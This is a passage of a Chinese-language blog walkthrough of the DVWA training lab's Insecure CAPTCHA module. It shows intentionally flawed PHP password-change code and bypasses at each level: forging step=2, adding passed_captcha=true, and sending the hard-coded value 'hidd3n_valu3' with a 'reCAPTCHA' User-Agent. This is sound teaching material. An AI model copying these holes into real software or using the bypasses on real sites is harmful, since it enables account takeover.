href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">            unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Vulnerability-Insecure-CAPTCHA（不安全的验证流程）"><a href="#Vulnerability-Insecure-CAPTCHA（不安全的验证流程）" class="headerlink" title="Vulnerability:Insecure CAPTCHA（不安全的验证流程）"></a>Vulnerability:Insecure CAPTCHA（不安全的验证流程）</h1><h2 id="Security-level-is-currently-low-4"><a href="#Security-level-is-currently-low-4" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>分析源码：</p>
<p>这里分着两个阶段</p>
<p>step == 1 验证用户身份，服务器会用私钥对用户进行身份验证，如果验证成功了才能进行修改密码</p>
<p>step == 2 如果如果两次输入的密码一致，就进行修改</p>
<p>这样的话，我们抓包修改step，直接跳过第一阶段 既可以实现修改密码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer( <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_SERVER</span>[ <span class="string">&#x27;REMOTE_ADDR&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_challenge_field&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 抓包,修改step=2 </p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051850.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">密码 123456 登录测试，登录成功</p>
<h2 id="Security-level-is-currently-medium-4"><a href="#Security-level-is-currently-medium-4" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：</p>
<p>我们发现<em>medium级别中的第二阶段多了一步验证passed_captcha的步骤，那我们就抓包修改step 和 passed_captcha</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer( <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_SERVER</span>[ <span class="string">&#x27;REMOTE_ADDR&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_challenge_field&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>抓包，并没有发现<em>passed_captcha，我们就在POST提交的参数后面加上</em></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051952.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>密码password，测试登录，登录成功！</p>
<h2 id="Security-level-is-currently-high-4"><a href="#Security-level-is-currently-high-4" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051510.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><a href="https://blog.csdn.net/qq_43968080/article/details/104093581">解决DVWA中reCAPTCHA API key missing from config file问题</a></p>
<p>Docker搭建的环境也会出现这个问题，只是没有报错，无法成功修改密码，解决掉就可以了。</p>
<p><strong>分析源码：</strong></p>
<p>这里没有在分阶段吗了，都合到一起，说明我们之前的方法不适用了。</p>
<p>分析代码我们可以看出服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数g-recaptcha-response不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。</p>
<p>搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数g-recaptcha-response、User-Agent上。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="variable">$resp</span> || </span><br><span class="line">        (</span><br><span class="line">            <span class="variable">$_POST</span>[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">            &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &#123;</span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Ops. Password mismatch</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>抓包</p>
<p><code>Docker搭建靶场的是这个参数：recaptcha_response_field=</code>hidd3n_valu3</p>
<p>通过phpstudy搭建靶场的是这个参数：g-recaptcha-response=hidd3n_valu3</p>
<p>这两个根据自己环境代码选就好</p>
<p>User-Agent：reCAPTCHA</p>
<p><img src="https://img-blog.csdnimg.cn/123095441ac9493d9fa904d165ecb428.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 修改成功，登录测试一下，测试成功！</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051051.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-4"><a href="#Security-level-is-currently-impossible-4" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>分析源码：</p>
<p>Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_new  = stripslashes( $pass_new );</span><br><span class="line">    $pass_new  = mysql_real_escape_string( $pass_new );</span><br><span class="line">    $pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line">    $pass_conf = stripslashes( $pass_conf );</span><br><span class="line">    $pass_conf = mysql_real_escape_string( $pass_conf );</span><br><span class="line">    $pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ &#x27;password_current&#x27; ];</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr );</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party</span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &#x27;recaptcha_private_key&#x27; ],</span><br><span class="line">        $_SERVER[ &#x27;REMOTE_ADDR&#x27; ],</span><br><span class="line">        $_POST[ &#x27;recaptcha_challenge_field&#x27; ],</span><br><span class="line">        $_POST[ &#x27;recaptcha_response_field&#x27; ] );</span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail?</span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123;</span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:password&#x27;, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        // Do both new password match and was the current password correct?</span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;</span><br><span class="line">            // Update the database</span><br><span class="line">            $data = $db-&gt;prepare( &#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27; );</span><br><span class="line">            $data-&gt;bindParam( &#x27;:password&#x27;, $pass_new, PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">            // Feedback for the end user - success!</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Feedback for the end user - failed!</span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">            $hide_form = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

